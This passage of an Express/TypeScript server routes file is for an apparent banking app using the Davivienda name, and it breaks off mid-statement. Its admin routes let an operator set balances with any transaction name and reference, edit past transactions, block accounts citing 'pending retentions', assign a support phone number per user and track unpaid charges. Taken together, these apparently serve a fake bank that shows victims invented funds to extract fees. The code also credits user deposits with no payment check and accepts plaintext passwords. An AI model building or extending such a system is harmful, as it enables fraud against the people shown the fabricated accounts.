import express, { type Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import session from "express-session";
import { storage } from "./storage";
import { z } from "zod";
import { 
  insertUserSchema, 
  insertTransactionSchema, 
  insertBeneficiarySchema,
  insertAccountChargeSchema
} from "@shared/schema";
import memorystore from 'memorystore';
import connectPgSimple from 'connect-pg-simple';
import { WebSocketServer } from 'ws';
import path from 'path';
import { randomInt } from 'crypto';
import bcrypt from 'bcryptjs';
import { getUncachableStripeClient, getStripePublishableKey } from "./stripeClient";

const BCRYPT_ROUNDS = 10;

const failedLoginAttempts = new Map<string, { count: number; lastAttempt: number; lockedUntil: number }>();
const MAX_LOGIN_ATTEMPTS = 5;
const LOCK_DURATION_MS = 15 * 60 * 1000;

function checkBruteForce(key: string): { blocked: boolean; remainingMs: number } {
  const record = failedLoginAttempts.get(key);
  if (!record) return { blocked: false, remainingMs: 0 };
  if (record.lockedUntil > Date.now()) {
    return { blocked: true, remainingMs: record.lockedUntil - Date.now() };
  }
  if (Date.now() - record.lastAttempt > LOCK_DURATION_MS) {
    failedLoginAttempts.delete(key);
    return { blocked: false, remainingMs: 0 };
  }
  return { blocked: false, remainingMs: 0 };
}

function recordFailedLogin(key: string): void {
  const record = failedLoginAttempts.get(key) || { count: 0, lastAttempt: 0, lockedUntil: 0 };
  record.count += 1;
  record.lastAttempt = Date.now();
  if (record.count >= MAX_LOGIN_ATTEMPTS) {
    record.lockedUntil = Date.now() + LOCK_DURATION_MS;
    record.count = 0;
  }
  failedLoginAttempts.set(key, record);
}

function clearFailedLogins(key: string): void {
  failedLoginAttempts.delete(key);
}

const recentTransactions = new Map<number, number[]>();
const MAX_TRANSACTIONS_PER_MINUTE = 5;
const TRANSACTION_WINDOW_MS = 60 * 1000;
const MAX_SINGLE_TRANSACTION = 50000000;

function checkTransactionFrequency(userId: number): boolean {
  const now = Date.now();
  const timestamps = recentTransactions.get(userId) || [];
  const recent = timestamps.filter(t => now - t < TRANSACTION_WINDOW_MS);
  recentTransactions.set(userId, recent);
  return recent.length >= MAX_TRANSACTIONS_PER_MINUTE;
}

function recordTransaction(userId: number): void {
  const timestamps = recentTransactions.get(userId) || [];
  timestamps.push(Date.now());
  recentTransactions.set(userId, timestamps);
}

function isBcryptHash(value: string): boolean {
  return /^\$2[aby]\$\d{2}\$.{53}$/.test(value);
}

async function verifyPassword(plaintext: string, stored: string): Promise<boolean> {
  if (isBcryptHash(stored)) {
    return bcrypt.compare(plaintext, stored);
  }
  return plaintext === stored;
}

async function hashPassword(plaintext: string): Promise<string> {
  return bcrypt.hash(plaintext, BCRYPT_ROUNDS);
}

// Extend the express-session types
declare module "express-session" {
  interface SessionData {
    userId?: number;
    sessionId?: number;
  }
}

// Extend global namespace for admin notifications
declare global {
  namespace NodeJS {
    interface Global {
      broadcastAdminNotification: (message: string) => void;
    }
  }
}

const MemoryStore = memorystore(session);

export async function registerRoutes(app: Express): Promise<Server> {
  // Initialize default data in database
  await storage.initializeDefaultData();
  
  app.set('trust proxy', 1);
  
  const isProduction = process.env.NODE_ENV === 'production';
  const sessionSecret = process.env.SESSION_SECRET || (isProduction ? undefined : 'davivienda-dev-secret');
  if (!sessionSecret) {
    throw new Error('SESSION_SECRET environment variable is required in production');
  }

  let sessionStore: session.Store;
  if (isProduction) {
    if (!process.env.DATABASE_URL) {
      throw new Error('DATABASE_URL is required in production for session persistence');
    }
    const PgStore = connectPgSimple(session);
    sessionStore = new PgStore({
      conString: process.env.DATABASE_URL,
      tableName: 'user_web_sessions',
      createTableIfMissing: true,
      pruneSessionInterval: 60 * 15,
    });
  } else {
    sessionStore = new MemoryStore({
      checkPeriod: 3600000
    });
  }

  app.use(session({
    cookie: { 
      maxAge: 30 * 60 * 1000,
      secure: isProduction,
      httpOnly: true,
      sameSite: 'lax'
    },
    store: sessionStore,
    rolling: true,
    resave: false,
    saveUninitialized: false,
    secret: sessionSecret
  }));

  // Check auth middleware
  const isAuthenticated = (req: Request, res: Response, next: NextFunction) => {
    if (req.session && req.session.userId) {
      next();
    } else {
      res.status(401).json({ message: "No autenticado" });
    }
  };

  // Check admin middleware
  const isAdmin = async (req: Request, res: Response, next: NextFunction) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "No autenticado" });
    }
    const user = await storage.getUser(req.session.userId);
    if (!user || user.isAdmin !== 1) {
      return res.status(403).json({ message: "No autorizado - Se requieren permisos de administrador" });
    }
    next();
  };

  const createAuditLog = async (req: Request, action: string, details: string, entityType?: string, entityId?: number, userId?: number) => {
    try {
      await storage.createAuditLog({
        userId: userId ?? req.session?.userId ?? null,
        action,
        details,
        ipAddress: req.ip || req.socket?.remoteAddress || null,
        userAgent: req.headers['user-agent'] || null,
        entityType: entityType || null,
        entityId: entityId || null,
      });
    } catch (e) {
      console.error("Error creating audit log:", e);
    }
  };

  app.get("/api/auth/session-status", (req: Request, res: Response) => {
    if (req.session && req.session.userId) {
      return res.status(200).json({ active: true, sessionTimeout: 30 * 60 * 1000 });
    }
    return res.status(200).json({ active: false });
  });

  // AUTH ROUTES
  app.post("/api/auth/login", async (req: Request, res: Response) => {
    try {
      const { username, password } = req.body;
      
      if (!username || !password) {
        return res.status(400).json({ message: "Documento y clave son requeridos" });
      }

      const loginKey = (req.ip || 'unknown') + ':' + username;
      const bruteCheck = checkBruteForce(loginKey);
      if (bruteCheck.blocked) {
        const minutesLeft = Math.ceil(bruteCheck.remainingMs / 60000);
        await createAuditLog(req, "login_blocked", `Intento de login bloqueado para "${username}" (IP: ${req.ip}) - cuenta temporalmente bloqueada`, "user", undefined, undefined);
        return res.status(429).json({ 
          message: `Cuenta temporalmente bloqueada por múltiples intentos fallidos. Intente de nuevo en ${minutesLeft} minutos.` 
        });
      }

      const user = await storage.getUserByUsername(username);
      
      if (!user) {
        recordFailedLogin(loginKey);
        return res.status(401).json({ message: "Credenciales incorrectas" });
      }

      const passwordValid = await verifyPassword(password, user.password);
      if (!passwordValid) {
        recordFailedLogin(loginKey);
        await createAuditLog(req, "login_failed", `Intento de login fallido para "${username}" (IP: ${req.ip})`, "user", user.id, user.id);
        (global as any).broadcastAdminNotification(`[SEGURIDAD] Intento de login fallido para "${user.name}" desde IP: ${req.ip}`);
        return res.status(401).json({ message: "Credenciales incorrectas" });
      }

      clearFailedLogins(loginKey);

      if (!isBcryptHash(user.password)) {
        const hashed = await hashPassword(password);
        await storage.updateUser(user.id, { password: hashed });
      }

      await storage.updateUserLastLogin(user.id);
      
      const userSession = await storage.createSession({
        userId: user.id,
        loginTime: new Date(),
        ipAddress: req.ip || "unknown",
        userAgent: req.headers['user-agent'] || "unknown"
      });
      
      req.session.userId = user.id;
      req.session.sessionId = userSession.id;
      
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[LOGIN] Usuario "${user.name}" ha iniciado sesión (${timestamp})`);
      
      await createAuditLog(req, "login", `Usuario "${user.name}" inició sesión`, "user", user.id, user.id);

      return res.status(200).json({ 
        message: "Login exitoso",
        user: {
          id: user.id,
          name: user.name,
          email: user.email,
          document: user.document,
          phone: user.phone,
          lastLogin: user.lastLogin,
          isAdmin: user.isAdmin || 0
        }
      });
    } catch (error) {
      console.error("Error en login:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/auth/register", async (req: Request, res: Response) => {
    try {
      const userData = insertUserSchema.parse(req.body);
      
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        return res.status(400).json({ message: "El usuario ya existe" });
      }
      
      userData.password = await hashPassword(userData.password);
      const user = await storage.createUser(userData);
      
      // Create account for user
      const accountNumber = randomInt(0, 10000000000).toString().padStart(10, '0');
      await storage.createAccount({
        userId: user.id,
        accountNumber,
        accountType: "Cuenta de Ahorros",
        balance: 0
      });
      
      // Enviar notificación de registro
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[REGISTRO] Nuevo usuario "${user.name}" se ha registrado (${timestamp})`);
      
      await createAuditLog(req, "register", `Nuevo usuario "${user.name}" registrado (doc: ${user.document})`, "user", user.id, user.id);

      return res.status(201).json({ 
        message: "Usuario registrado con éxito",
        user: {
          id: user.id,
          name: user.name,
          email: user.email
        }
      });
    } catch (error) {
      console.error("Error en registro:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Datos de usuario inválidos", errors: error.errors });
      }
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/auth/logout", async (req: Request, res: Response) => {
    try {
      // Obtener datos del usuario antes de destruir la sesión
      if (req.session && req.session.userId) {
        const userId = req.session.userId;
        const sessionId = req.session.sessionId as number;
        const user = await storage.getUser(userId);
        
        if (user) {
          // Actualizar registro de la sesión con tiempo de salida
          if (sessionId) {
            await storage.updateSessionLogout(sessionId, new Date());
          }
          
          // Enviar notificación de cierre de sesión
          const timestamp = new Date().toLocaleString();
          (global as any).broadcastAdminNotification(`[LOGOUT] Usuario "${user.name}" ha cerrado sesión (${timestamp})`);
          
          await createAuditLog(req, "logout", `Usuario "${user.name}" cerró sesión`, "user", user.id, user.id);
        }
      }
      
      // Destruir sesión
      req.session.destroy(() => {
        res.status(200).json({ message: "Sesión cerrada" });
      });
    } catch (error) {
      console.error("Error en logout:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // USER ROUTES
  app.get("/api/user", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }
      
      return res.status(200).json({
        id: user.id,
        username: user.username,
        name: user.name,
        email: user.email,
        document: user.document,
        phone: user.phone,
        lastLogin: user.lastLogin,
        isAdmin: user.isAdmin || 0,
        customSupportPhone: user.customSupportPhone || null
      });
    } catch (error) {
      console.error("Error obteniendo usuario:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // ACCOUNT ROUTES
  app.get("/api/account", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const account = await storage.getAccountByUserId(userId);
      
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      return res.status(200).json(account);
    } catch (error) {
      console.error("Error obteniendo cuenta:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // TRANSACTION ROUTES
  app.get("/api/transactions", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const account = await storage.getAccountByUserId(userId);
      
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      const transactions = await storage.getTransactionsByAccountId(account.id);
      return res.status(200).json(transactions);
    } catch (error) {
      console.error("Error obteniendo transacciones:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/transfer", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, recipientAccountNumber, description } = req.body;
      
      if (!amount || !recipientAccountNumber) {
        return res.status(400).json({ message: "Monto y cuenta destino son requeridos" });
      }
      
      const numAmount = Number(amount);
      if (isNaN(numAmount) || numAmount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }

      if (numAmount > MAX_SINGLE_TRANSACTION) {
        await createAuditLog(req, "suspicious_transaction", `Intento de transferencia sospechosa: $${numAmount} (excede límite)`, "user", undefined, userId);
        (global as any).broadcastAdminNotification(`[ALERTA] Transacción sospechosa: usuario ${userId} intentó transferir $${numAmount.toLocaleString()}`);
        return res.status(400).json({ message: "El monto excede el límite máximo por transacción" });
      }

      if (checkTransactionFrequency(userId)) {
        await createAuditLog(req, "suspicious_activity", `Actividad sospechosa: múltiples transacciones rápidas de usuario ${userId}`, "user", undefined, userId);
        (global as any).broadcastAdminNotification(`[ALERTA] Actividad sospechosa: usuario ${userId} realizando transacciones muy rápido`);
        return res.status(429).json({ message: "Demasiadas transacciones en poco tiempo. Espere un momento." });
      }
      
      const senderAccount = await storage.getAccountByUserId(userId);
      if (!senderAccount) {
        return res.status(404).json({ message: "Cuenta origen no encontrada" });
      }
      
      if (senderAccount.status === "BLOQUEADA" || !senderAccount.status || senderAccount.status === "PENDIENTE") {
        const message = senderAccount.status === "BLOQUEADA" 
          ? "No puede realizar transferencias. Cuenta bloqueada por retenciones pendientes."
          : "Debe activar su cuenta solicitando su tarjeta o inscribiendo su TAG para realizar transferencias.";
        return res.status(403).json({ 
          message,
          error_code: "4004"
        });
      }
      
      if (senderAccount.balance < numAmount) {
        return res.status(400).json({ message: "Fondos insuficientes" });
      }
      
      const recipientAccount = await storage.getAccountByNumber(recipientAccountNumber);
      if (!recipientAccount) {
        return res.status(404).json({ message: "Cuenta destino no encontrada" });
      }

      if (senderAccount.id === recipientAccount.id) {
        return res.status(400).json({ message: "No puede transferir a su propia cuenta" });
      }

      recordTransaction(userId);
      
      // Create outgoing transaction
      const outgoingTransaction = await storage.createTransaction({
        accountId: senderAccount.id,
        amount: -amount,
        description: description || `Transferencia a cuenta ${recipientAccountNumber}`,
        date: new Date(),
        type: "transfer",
        reference: `TRANS-${Date.now()}`,
        recipientId: recipientAccount.id
      });
      
      // Create incoming transaction
      await storage.createTransaction({
        accountId: recipientAccount.id,
        amount: amount,
        description: `Transferencia de cuenta ${senderAccount.accountNumber}`,
        date: new Date(),
        type: "deposit",
        reference: outgoingTransaction.reference,
        recipientId: null
      });
      
      // Update balances
      await storage.updateAccountBalance(senderAccount.id, -amount);
      await storage.updateAccountBalance(recipientAccount.id, amount);
      
      await createAuditLog(req, "transfer", `Transferencia de $${amount} a cuenta ${recipientAccountNumber}. Ref: ${outgoingTransaction.reference}`, "transaction", outgoingTransaction.id);

      return res.status(200).json({ 
        message: "Transferencia exitosa",
        transaction: outgoingTransaction
      });
    } catch (error) {
      console.error("Error en transferencia:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/payment", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, serviceId, reference } = req.body;
      
      if (!amount || !serviceId || !reference) {
        return res.status(400).json({ message: "Todos los campos son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get account
      const account = await storage.getAccountByUserId(userId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Check balance
      if (account.balance < amount) {
        return res.status(400).json({ message: "Fondos insuficientes" });
      }
      
      // Check if account is blocked
      if (account.status === "BLOQUEADA") {
        return res.status(403).json({ 
          message: "No puede realizar pagos. Cuenta bloqueada por retenciones pendientes.",
          error_code: "4004"
        });
      }
      
      // Get service
      const service = await storage.getServiceById(serviceId);
      if (!service) {
        return res.status(404).json({ message: "Servicio no encontrado" });
      }
      
      // Create transaction
      const transaction = await storage.createTransaction({
        accountId: account.id,
        amount: -amount,
        description: `Pago ${service.name}`,
        date: new Date(),
        type: "payment",
        reference: reference,
        recipientId: null
      });
      
      // Update balance
      await storage.updateAccountBalance(account.id, -amount);
      
      await createAuditLog(req, "payment", `Pago de $${amount} por servicio ${service.name}. Ref: ${reference}`, "transaction", transaction.id);

      return res.status(200).json({ 
        message: "Pago exitoso",
        transaction: transaction
      });
    } catch (error) {
      console.error("Error en pago:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/deposit", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, method } = req.body;
      
      if (!amount || !method) {
        return res.status(400).json({ message: "Monto y método son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get account
      const account = await storage.getAccountByUserId(userId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Create transaction
      const transaction = await storage.createTransaction({
        accountId: account.id,
        amount: amount,
        description: `Depósito por ${method}`,
        date: new Date(),
        type: "deposit",
        reference: `DEP-${Date.now()}`,
        recipientId: null
      });
      
      // Update balance
      await storage.updateAccountBalance(account.id, amount);
      
      await createAuditLog(req, "deposit", `Depósito de $${amount} por ${method}`, "transaction", transaction.id);

      return res.status(200).json({ 
        message: "Depósito exitoso",
        transaction: transaction
      });
    } catch (error) {
      console.error("Error en depósito:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/withdrawal", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, method } = req.body;
      
      if (!amount || !method) {
        return res.status(400).json({ message: "Monto y método son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get account
      const account = await storage.getAccountByUserId(userId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Check balance
      if (account.balance < amount) {
        return res.status(400).json({ message: "Fondos insuficientes" });
      }
      
      // Check if account is blocked
      if (account.status === "BLOQUEADA") {
        return res.status(403).json({ 
          message: "No puede realizar retiros. Cuenta bloqueada por retenciones pendientes.",
          error_code: "4004"
        });
      }
      
      // Create transaction
      const transaction = await storage.createTransaction({
        accountId: account.id,
        amount: -amount,
        description: `Retiro por ${method}`,
        date: new Date(),
        type: "withdrawal",
        reference: `WIT-${Date.now()}`,
        recipientId: null
      });
      
      // Update balance
      await storage.updateAccountBalance(account.id, -amount);
      
      await createAuditLog(req, "withdrawal", `Retiro de $${amount} por ${method}`, "transaction", transaction.id);

      return res.status(200).json({ 
        message: "Retiro exitoso",
        transaction: transaction,
        withdrawalCode: randomInt(100000, 1000000)
      });
    } catch (error) {
      console.error("Error en retiro:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // BENEFICIARY ROUTES
  app.get("/api/beneficiaries", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const beneficiaries = await storage.getBeneficiariesByUserId(userId);
      return res.status(200).json(beneficiaries);
    } catch (error) {
      console.error("Error obteniendo beneficiarios:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/beneficiaries", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const beneficiaryData = {
        ...req.body,
        userId
      };
      
      const validatedData = insertBeneficiarySchema.parse(beneficiaryData);
      const beneficiary = await storage.createBeneficiary(validatedData);
      
      return res.status(201).json({
        message: "Beneficiario agregado con éxito",
        beneficiary
      });
    } catch (error) {
      console.error("Error agregando beneficiario:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Datos inválidos", errors: error.errors });
      }
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // ADMIN PANEL ROUTES
  app.get("/admin", (req: Request, res: Response) => {
    const adminPath = path.join(process.cwd(), 'client', 'public', 'admin.html');
    res.sendFile(adminPath);
  });

  app.get("/admin-panel", (req: Request, res: Response) => {
    const adminPanelPath = path.join(process.cwd(), 'client', 'public', 'admin-panel.html');
    res.sendFile(adminPanelPath);
  });

  // API ADMIN ROUTES
  app.get("/api/admin/users", isAdmin, async (req: Request, res: Response) => {
    try {
      const users = await storage.getAllUsers();
      res.status(200).json(users);
    } catch (error) {
      console.error("Error obteniendo usuarios:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/admin/users", isAdmin, async (req: Request, res: Response) => {
    try {
      const userData = insertUserSchema.parse(req.body);
      
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        return res.status(400).json({ message: "El usuario ya existe" });
      }
      
      userData.password = await hashPassword(userData.password);
      const user = await storage.createUser(userData);
      
      // Create account for user
      const accountNumber = randomInt(0, 10000000000).toString().padStart(10, '0');
      await storage.createAccount({
        userId: user.id,
        accountNumber,
        accountType: "Cuenta de Ahorros",
        balance: 0
      });
      
      // Notification
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[REGISTRO] Usuario "${user.name}" ha sido registrado por administrador (${timestamp})`);
      
      await createAuditLog(req, "admin_user_update", `Admin creó usuario "${user.name}" (doc: ${user.document})`, "user", user.id);

      res.status(201).json(user);
    } catch (error) {
      console.error("Error creando usuario:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Datos de usuario inválidos", errors: error.errors });
      }
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/users/:id", isAdmin, async (req: Request, res: Response) => {
    try {
      const userId = parseInt(req.params.id);
      const userData = req.body;
      
      const existingUser = await storage.getUser(userId);
      if (!existingUser) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }
      
      if (userData.password && userData.password !== existingUser.password && !isBcryptHash(userData.password)) {
        userData.password = await hashPassword(userData.password);
      }

      const updatedUser = await storage.updateUser(userId, userData);
      
      // Notification
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ACTUALIZACION] Usuario "${updatedUser.name}" ha sido actualizado por administrador (${timestamp})`);
      
      await createAuditLog(req, "admin_user_update", `Admin actualizó usuario "${updatedUser.name}" (id: ${userId})`, "user", userId);

      res.status(200).json(updatedUser);
    } catch (error) {
      console.error("Error actualizando usuario:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/accounts", isAdmin, async (req: Request, res: Response) => {
    try {
      const accounts = await storage.getAllAccounts();
      
      // Get user information for each account
      const accountsWithUserInfo = await Promise.all(accounts.map(async (account) => {
        const user = await storage.getUser(account.userId);
        return {
          ...account,
          userName: user ? user.name : null
        };
      }));
      
      res.status(200).json(accountsWithUserInfo);
    } catch (error) {
      console.error("Error obteniendo cuentas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/accounts/:id/balance", isAdmin, async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      const { amount, message, reference: customReference, transactionName } = req.body;
      
      if (!amount || isNaN(amount)) {
        return res.status(400).json({ message: "Monto inválido" });
      }
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Add balance
      const updatedAccount = await storage.updateAccountBalance(accountId, amount);
      
      // Create transaction record
      const transactionType = amount > 0 ? "deposit" : "withdrawal";
      const transactionAmount = Math.abs(amount);
      
      // Si tenemos un nombre de transacción personalizado, lo usamos, sino usamos el mensaje
      // o un texto predeterminado
      const transactionDescription = transactionName || message || (amount > 0 ? "Ajuste de saldo positivo" : "Ajuste de saldo negativo");
      const reference = customReference || `ADJ-${Date.now().toString().slice(-6)}`;
      
      await storage.createTransaction({
        accountId,
        amount: transactionAmount,
        description: transactionDescription,
        date: new Date(),
        type: transactionType,
        reference,
        recipientId: null
      });
      
      // Notification
      const user = await storage.getUser(account.userId);
      const timestamp = new Date().toLocaleString();
      const adjustmentType = amount > 0 ? "aumentado" : "reducido";
      (global as any).broadcastAdminNotification(`[AJUSTE] Saldo de "${user?.name}" se ha ${adjustmentType} en $${Math.abs(amount).toLocaleString()} (${timestamp})`);
      
      await createAuditLog(req, "admin_balance_adjust", `Admin ajustó saldo de cuenta ${account.accountNumber} (usuario: ${user?.name}) en $${amount}`, "account", accountId);

      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error actualizando saldo:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/accounts/:id/status", isAdmin, async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      const { status, statusMessage } = req.body;
      
      if (!status) {
        return res.status(400).json({ message: "Estado requerido" });
      }
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Update status
      const updatedAccount = await storage.updateAccountStatus(accountId, status, statusMessage);
      
      // Notification
      const user = await storage.getUser(account.userId);
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ESTADO] Cuenta de "${user?.name}" cambió a estado "${status}" (${timestamp})`);
      
      await createAuditLog(req, "admin_status_change", `Admin cambió estado de cuenta ${account.accountNumber} (usuario: ${user?.name}) a "${status}"`, "account", accountId);

      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error actualizando estado:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Ruta para actualizar datos generales de una cuenta
  app.put("/api/admin/accounts/:id/update", isAdmin, async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      const accountData = req.body;
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Update account data
      const updatedAccount = await storage.updateAccount(accountId, accountData);
      
      // Notification
      const user = await storage.getUser(account.userId);
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ACTUALIZACIÓN] Datos de cuenta de "${user?.name}" actualizados (${timestamp})`);
      
      await createAuditLog(req, "admin_user_update", `Admin actualizó datos de cuenta ${account.accountNumber} (usuario: ${user?.name})`, "account", accountId);

      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error actualizando cuenta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Ruta para eliminar una cuenta
  app.delete("/api/admin/accounts/:id", isAdmin, async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Get user info for notification before deletion
      const user = await storage.getUser(account.userId);
      
      // Delete account (this will also delete all related transactions)
      const deleted = await storage.deleteAccount(accountId);
      
      if (!deleted) {
        return res.status(500).json({ message: "Error al eliminar la cuenta" });
      }
      
      // Notification
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ELIMINACIÓN] Cuenta de "${user?.name}" (${account.accountNumber}) ha sido eliminada (${timestamp})`);
      
      await createAuditLog(req, "admin_user_update", `Admin eliminó cuenta ${account.accountNumber} (usuario: ${user?.name})`, "account", accountId);

      res.status(200).json({ message: "Cuenta eliminada exitosamente" });
    } catch (error) {
      console.error("Error eliminando cuenta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/transactions", isAdmin, async (req: Request, res: Response) => {
    try {
      const transactions = await storage.getAllTransactions();
      
      // Enrich transactions with account information
      const enrichedTransactions = await Promise.all(transactions.map(async (transaction) => {
        const account = await storage.getAccountById(transaction.accountId);
        return {
          ...transaction,
          accountNumber: account ? account.accountNumber : null,
          userName: account ? (await storage.getUser(account.userId))?.name : null
        };
      }));
      
      res.status(200).json(enrichedTransactions);
    } catch (error) {
      console.error("Error obteniendo transacciones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // Ruta para actualizar una transacción
  app.put("/api/admin/transactions/:id", isAdmin, async (req: Request, res: Response) => {
    try {
      const transactionId = parseInt(req.params.id);
      const transactionData = req.body;
      
      // Actualizar la transacción
      const updatedTransaction = await storage.updateTransaction(transactionId, transactionData);
      
      if (!updatedTransaction) {
        return res.status(404).json({ message: "Transacción no encontrada" });
      }
      
      // Notificación
      const account = await storage.getAccountById(updatedTransaction.accountId);
      const user = account ? await storage.getUser(account.userId) : null;
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(
        `[TRANSACCIÓN] Transacción de ${user?.name || 'usuario desconocido'} actualizada (${timestamp})`
      );
      
      await createAuditLog(req, "admin_user_update", `Admin actualizó transacción #${transactionId} de ${user?.name || 'usuario desconocido'}`, "transaction", transactionId);

      res.status(200).json(updatedTransaction);
    } catch (error) {
      console.error("Error actualizando transacción:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/sessions", isAdmin, async (req: Request, res: Response) => {
    try {
      const sessions = await storage.getAllSessions();
      
      // Enrich sessions with user information
      const enrichedSessions = await Promise.all(sessions.map(async (session) => {
        const user = await storage.getUser(session.userId);
        return {
          ...session,
          userName: user ? user.name : null
        };
      }));
      
      res.status(200).json(enrichedSessions);
    } catch (error) {
      console.error("Error obteniendo sesiones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/statistics", isAdmin, async (req: Request, res: Response) => {
    try {
      const users = await storage.getAllUsers();
      const accounts = await storage.getAllAccounts();
      const sessions = await storage.getAllSessions();
      const allTransactions = await storage.getAllTransactions();
      const allCharges = await storage.getAllAccountCharges();
      const auditLogs = await storage.getAllAuditLogs();
      
      const totalUsers = users.length;
      const activeAccounts = accounts.filter(a => a.status !== 'BLOQUEADA').length;
      const blockedAccounts = accounts.filter(a => a.status === 'BLOQUEADA').length;
      
      const oneDayAgo = new Date();
      oneDayAgo.setDate(oneDayAgo.getDate() - 1);
      
      const activeSessions = sessions.filter(s => {
        if (s.logoutTime !== null) return false;
        const loginTime = new Date(s.loginTime);
        return loginTime > oneDayAgo;
      }).length;
      
      const recentUsers = [...users]
        .sort((a, b) => new Date(b.lastLogin).getTime() - new Date(a.lastLogin).getTime())
        .slice(0, 5);

      const totalBalance = accounts.reduce((sum, a) => sum + (a.balance || 0), 0);

      const todayStart = new Date();
      todayStart.setHours(0, 0, 0, 0);
      const transactionsToday = allTransactions.filter(t => new Date(t.date) >= todayStart).length;
      const volumeToday = allTransactions
        .filter(t => new Date(t.date) >= todayStart)
        .reduce((sum, t) => sum + Math.abs(t.amount || 0), 0);

      const pendingCharges = allCharges.filter(c => c.status === 'pending_payment').length;
      const paidCharges = allCharges.filter(c => c.status === 'paid').length;

      const securityAlerts = auditLogs
        .filter(l => ['login_failed', 'login_blocked', 'suspicious_transaction', 'suspicious_activity'].includes(l.action))
